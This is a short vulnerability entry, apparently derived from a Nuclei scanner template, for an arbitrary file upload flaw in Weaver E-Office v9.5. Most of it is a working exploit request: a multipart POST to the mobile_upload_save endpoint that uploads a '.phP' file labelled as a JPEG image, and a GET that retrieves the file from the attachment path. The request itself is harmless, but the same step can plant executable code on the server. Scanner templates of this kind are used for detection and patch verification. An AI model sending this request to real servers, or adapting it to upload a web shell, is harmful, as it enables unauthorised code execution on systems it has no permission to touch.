# Vulnerability: Weaver E-Office v9.5 - Arbitrary File Upload
**Classification:** E-OFFICE
**Source:** Nuclei Template (`weaver-eoffice-file-upload.yaml`)

## Description
Weaver E-Office version 9.5 is susceptible to an arbitrary file upload vulnerability. This flaw allows malicious actors to upload and execute arbitrary code or files without proper validation or authorization.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="upload_quwan"; filename="{{filename}}.phP"
Content-Type: image/jpeg

{{randstr}}
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--

GET /attachment/{{id}}/{{filename}}.phP HTTP/1.1
Host: {{Hostname}}
```

